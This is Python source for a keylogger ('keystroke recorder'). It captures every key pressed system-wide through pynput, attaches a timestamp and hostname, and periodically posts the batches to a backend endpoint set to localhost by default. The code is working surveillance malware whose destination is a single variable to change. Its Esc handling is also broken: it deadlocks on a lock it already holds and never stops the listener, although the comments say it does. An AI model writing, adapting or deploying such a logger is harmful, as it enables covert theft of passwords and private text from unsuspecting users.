from pynput import keyboard
import requests
import threading
from datetime import datetime
import time
import socket

# Backend API endpoint (update if backend runs on a different host/port)
BACKEND_URL = "http://localhost:5000/record"

# Interval in seconds to send batched keystrokes
SEND_INTERVAL = 20  # Adjust as needed (e.g., 5 seconds)

# Buffer to store keystrokes
keystroke_buffer = []
buffer_lock = threading.Lock()  # Thread-safe access to the buffer


# Function to send batched keystrokes to the backend
def send_batched_keystrokes():
    while True:
        time.sleep(SEND_INTERVAL)
        print("doing something")
        with buffer_lock:
            if keystroke_buffer:  # Only send if there are keystrokes
                payload = keystroke_buffer.copy()
                keystroke_buffer.clear()  # Clear the buffer after copying
                try:
                    response = requests.post(BACKEND_URL, json=payload)
                    response.raise_for_status()
                    print(f"Sent {len(payload)} keystrokes to backend")
                except requests.exceptions.RequestException as e:
                    print(f"Failed to send keystrokes: {e}")
                    # Optionally, add failed keystrokes back to buffer for retry
                    keystroke_buffer.extend(payload)


# Function to add a keystroke to the buffer
def buffer_keystroke(key_str):
    with buffer_lock:
        keystroke_buffer.append(
            {
                "key": key_str,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "host": socket.gethostbyaddr(socket.gethostname())[0],
            }
        )


# Function to handle key press events
def on_press(key):
    print("{} was just preseed to buffer".format(key))
    try:
        key_str = key.char  # Alphanumeric keys
    except AttributeError:
        key_str = str(key)  # Special keys (e.g., Key.space)

    buffer_keystroke(key_str)


# Function to handle key release (stops listener on Esc)
def on_release(key):
    print("releasing something")
    if key == keyboard.Key.esc:
        # Send any remaining keystrokes before stopping
        with buffer_lock:
            if keystroke_buffer:
                send_immediate()
        pass


# Function to send buffer immediately (used on shutdown)
def send_immediate():
    with buffer_lock:
        if keystroke_buffer:
            payload = keystroke_buffer.copy()
            keystroke_buffer.clear()
            try:
                response = requests.post(BACKEND_URL, json=payload)
                response.raise_for_status()
                print(f"Sent {len(payload)} keystrokes to backend (immediate)")
            except requests.exceptions.RequestException as e:
                print(f"Failed to send immediate keystrokes: {e}")


# Start the keyboard listener and batch sender
def main():
    print(
        f"Starting keystroke recorder... Sending batches every {SEND_INTERVAL} seconds. Press Esc to stop."
    )

    # Start the batch sending thread
    sender_thread = threading.Thread(target=send_batched_keystrokes, daemon=True)
    sender_thread.start()

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
